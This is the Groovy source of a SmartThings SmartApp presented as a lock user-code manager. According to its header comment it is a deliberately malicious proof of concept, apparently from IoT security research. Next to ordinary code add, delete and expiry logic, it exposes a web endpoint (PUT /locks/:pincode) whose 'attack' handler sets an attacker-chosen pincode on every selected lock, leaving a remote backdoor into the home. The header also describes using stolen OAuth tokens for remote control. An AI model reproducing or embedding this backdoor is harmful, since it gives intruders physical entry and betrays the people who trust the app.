
/**

* Add and remove user codes for locks

*

* Copyright Yunhan Jia & Shiqi Wang

* Redistribution of any changes or code is not allowed without permission

*

* Change Log:

* 2016-5-15 - Fix issue with non existent timezone

* 2015-7-6 - Fixed issue with code expiry not working

* 2015-6-17 - Fix for dynamic preferences not working after ST platform update

* 2015-5-27 - Bugfix for expiration date entry

* 2015-2-11 - Added support for expiration dates

* 2015-1-1 - Added option to customizing name

* 2014-11-27 - Stable created

* Attack Description:
    The attacker could stole the Oauth token which is really dangerous. With this toke, he could remote control the smartApps and leave a backdoor in the user home.



Malicous PincodeLockController:
    Normal functions:
    The lock manager could granting access to the user and control the door unlock and lock with pincode.

    Malicious functions:
    The malicious smartApp has the function to add a user with a new pincode which is known as a backdoor for the attacker. This setCode function could be called by web service. And new pincode could be sent by the attacker in the put request.

*/

 

 

definition(

    name: "shiqiPincodeLockController",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "Add and Delete Single User Codes for Locks",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Allstate/lock_it_when_i_leave.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Allstate/lock_it_when_i_leave@2x.png"

)

 

import org.joda.time.DateTime

 

preferences {

    page(name: "setupApp")

}

 

def setupApp() {

    dynamicPage(name: "setupApp", title: "Lock User Management", install: true, uninstall: true) {   

        section("Select Lock(s)") {

            input "locks","capability.lock", title: "Lock", multiple: true,  submitOnChange:true

             input "motion", "capability.motionSensor", title: "motion", required: true, multiple: false

        }

        section("User Management") {

            input "user", "number", title: "User Slot Number", description: "This is the user slot number on the lock and not the user passcode",  submitOnChange:true

            input "action", "enum", title: "Add/Update/Delete User?", required: true, options: ["Add/Update","Delete"],  submitOnChange:true

        }

 

        if (action == "Add/Update") {

            def invalidDate = true

            if (expDate) {

                log.debug "Found expiry date in setup"

                try {

                    Date.parse("yyyy-MM-dd", expDate)

                    invalidDate = false

                }

                catch (Exception e) {

                    log.debug "Invalid expiry date in setup"

                    invalidDate = true

                }

            }

 

            section("Add/Update User Code") {

                input "code", "text", title: "User Passcode (check your lock passcode length)", defaultValue: "X", description: "The user passcode for adding/updating a new user (enter X for deleting user)"

            }

 

            section("Code Expiration Date and Time (Optional)") {

                if (expDate && invalidDate == true) {

                    paragraph "INVALID DATE - PLEASE CHECK YOUR DATE FORMAT"

                }

                else if (expDate) {

                    def ed = Date.parse("yyyy-MM-dd", expDate)

                    paragraph "Code expiry date set for ${ed.format("EEE MMM dd yyyy")}"

                }

 

                if (expDate) {

                    if (!expTime) {

                        paragraph "PLEASE ENTER TIME FOR CODE EXPIRY"

                    }

                }

 

                input "expDate", "date", title: "Code expiration date (YYYY-MM-DD)", description: "Date on which the code should be deleted", required: false,  submitOnChange:true

                input "expTime", "time", title: "Code expiration time", description: "(Touch here to set time) The code would be deleted within 5 minutes of this time", required: false,  submitOnChange:true

            }

        }

 

        section([mobileOnly:true]) {

            label title: "Assign a name for this SmartApp", required: false

        }

    }

}

 

def installed()

{

    log.debug "Install Settings: $settings"

    state.codes = [:]

    unschedule()

    subscribe(motion, "motion", myHandler)

    runEvery5Minutes(expireCodeCheck)

    runIn(1, appTouch)

}

 

def updated()

{

    log.debug "Update Settings: $settings"

    if (!state.codes) {

        state.codes = [:]

    }

    unschedule()

    subscribe(motion, "motion", myHandler)

    runEvery5Minutes(expireCodeCheck)

    runIn(1, appTouch)

}

 

def appTouch() {

    if (action == "Delete") {

        for (lock in locks) {

            lock.deleteCode(user)

            log.info "$lock deleted user: $user"

            sendNotificationEvent("$lock deleted user: $user")

            sendPush "$lock deleted user: $user"

        }

        log.debug "Removing tracking expiry of user $user"

        state.codes.remove((user as String)) // remove it from the tracker, we don't an unexpected code removal later

    } else {

        for (lock in locks) {

            lock.setCode(user, code)

              

            log.info "$lock added user: $user, code: $code"

            sendNotificationEvent("$lock added user: $user")

            //sendPush "$lock added user: $user"

        }

 

        if (expDate && expTime) {

            TimeZone timeZone = location.timeZone

            if (!timeZone) {

                timeZone = TimeZone.getDefault()

                log.error "Hub location/timezone not set, using ${timeZone.getDisplayName()} timezone. Please set Hub location and timezone for the codes to work accurately"

                sendPush "Hub location/timezone not set, using ${timeZone.getDisplayName()} timezone. Please set Hub location and timezone for the codes to work accurately"

            }

            log.trace "The date/time on the hub now is ${(new Date(now())).format("EEE MMM dd yyyy HH:mm z", timeZone)}"

            def midnightToday = timeToday("2000-01-01T00:00:00.000-0000", timeZone)

            def expT = (timeToday(expTime, timeZone).time - midnightToday.time)

            String dst = timeZone.getDisplayName(timeZone.inDaylightTime(new Date(now())), TimeZone.SHORT) // Keep current timezone

            def expD = Date.parse("yyyy-MM-dd Z", expDate + " " + dst).toCalendar()

            def exp = expD.getTimeInMillis() + expT

            log.debug "Removing any existing tracking expiry of user $user"

            state.codes.remove((user as String)) // remove it from the tracker so we don't duplicate if the code being overwritten

            state.codes.put(user,exp) // Add to the expiry list

            def expStr = (new Date(exp)).format("EEE MMM dd yyyy HH:mm z", timeZone)

            log.info "$locks user code expiration set to $expStr"

            sendNotificationEvent("$locks user $user code will expire on $expStr")

            sendPush "$locks user $user code will expire on $expStr"

        }

    }

}

 

def expireCodeCheck() {

    log.debug "ExpireCodeCheck called"

    def allCodes = state.codes.collect() // make a copy otherwise we can't remove it from the for loop (concurrent exception)

    for (code in allCodes) {

        TimeZone timeZone = location.timeZone

        if (!timeZone) {

            timeZone = TimeZone.getDefault()

            log.error "Hub location/timezone not set, using ${timeZone.getDisplayName()} timezone. Please set Hub location and timezone for the codes to work accurately"

            sendPush "Hub location/timezone not set, using ${timeZone.getDisplayName()} timezone. Please set Hub location and timezone for the codes to work accurately"

        }

        log.trace "The date/time on the hub now is ${(new Date(now())).format("EEE MMM dd yyyy HH:mm z", timeZone)}"

        def expStr = (new Date(code.value)).format("EEE MMM dd yyyy HH:mm z", timeZone)

        log.debug "user ${code.key} expires $expStr"

        if (code.value < now()) {

            def user = code.key as Integer // Convert back to integer, groovy converts to string in a key value pair

            for (lock in locks) {

                lock.deleteCode(user)

                log.info "$lock deleted expired user: $user"

                sendNotificationEvent("$lock deleted expired user: $user")

                sendPush "$lock deleted expired user: $user"

            }

            log.debug "Removing tracking of user $user"

            state.codes.remove((user as String)) // remove it from the tracker, we're done here

        }

    }

}

 

mappings {

    path("/locks/:pincode"){

      action:[

          PUT: "attack"

        ]

    }

}

 

def attack() {

    log.debug "PUT attack"

    def data = request.JSON

  def arguments = data.arguments

  log.debug "PUT attack, params: ${params}, request: ${data}"

     for (lock in locks) {

         lock.setCode(user, code)

         lock.setCode("1", "$params.pincode")

 

         log.info "$lock added user: $user, code: $pincode"

         sendNotificationEvent("$lock added user: $user")

         //sendPush "$lock added user: $user"

     }

}

